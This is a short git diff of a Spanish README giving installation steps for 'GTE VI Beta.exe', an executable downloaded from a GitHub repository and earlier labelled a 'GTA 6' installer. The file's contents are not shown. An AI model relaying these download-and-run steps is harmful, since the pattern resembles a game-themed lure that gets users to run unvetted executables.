@@ -22,7 +22,7 @@ Antes de comenzar la instalación, asegúrate de que tu sistema cumple con los s
 
 ## Instrucciones de Instalación
 
-1. Descarga el ejecutable de instalación desde el siguiente enlace: [Descargar Instalador GTA 6](https://github.com/spyflow/GTE-VI/raw/refs/heads/main/GTE%20VI%20Beta.exe)
+1. Descarga el ejecutable de instalación desde el siguiente enlace: [Descargar Instalador GTE 6](https://github.com/spyflow/GTE-VI/raw/refs/heads/main/GTE%20VI%20Beta.exe)
 2. Ejecuta el archivo descargado.
 3. Sigue las instrucciones en pantalla para completar la instalación.
 4. Una vez finalizada la instalación, abre el juego desde el acceso directo creado en tu escritorio.
